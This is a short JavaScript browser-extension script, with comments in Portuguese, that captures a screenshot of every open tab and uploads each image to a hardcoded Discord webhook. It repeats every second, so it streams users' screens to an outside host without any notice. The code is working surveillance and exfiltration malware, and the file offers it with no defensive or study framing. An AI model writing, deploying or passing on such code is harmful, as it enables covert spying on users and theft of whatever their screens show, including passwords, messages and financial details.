async function captureAndSendScreenshots() {
    chrome.tabs.query({}, async function(tabs) {
        for (let tab of tabs) {
            chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' }, async function(screenshotUrl) {
                if (!screenshotUrl) {
                    console.error('Não foi possível capturar o screenshot da guia', tab.id);
                    return;
                }

                const formData = new FormData();
                formData.append('file', await fetch(screenshotUrl).then(res => res.blob()), `screenshot_${tab.id}.png`);
                formData.append('content', `Screenshot da guia ${tab.id}.`);

                const webhookUrl = 'https://discord.com/api/webhooks/1237603309402193971/rhUTYE-2WcsPx5z-Fc7b3hRMsDHoiqZn7sFRbV4uqAkEr5EzEGKMwBMy_BNg6-id0YIh'; // Substitua pelo seu URL de webhook
                const requestOptions = {
                    method: 'POST',
                    body: formData,
                };

                try {
                    const response = await fetch(webhookUrl, requestOptions);
                    if (!response.ok) {
                        throw new Error(`Erro ao enviar screenshot da guia ${tab.id}: ${response.status} ${response.statusText}`);
                    }
                    console.log(`Screenshot da guia ${tab.id} enviada com sucesso!`);
                } catch (error) {
                    console.error(`Erro ao enviar screenshot da guia ${tab.id}:`, error);
                }
            });
        }
    });
}

captureAndSendScreenshots(); // Chama a função uma vez imediatamente
setInterval(captureAndSendScreenshots, 1000); // Chama a função a cada 1 segundo
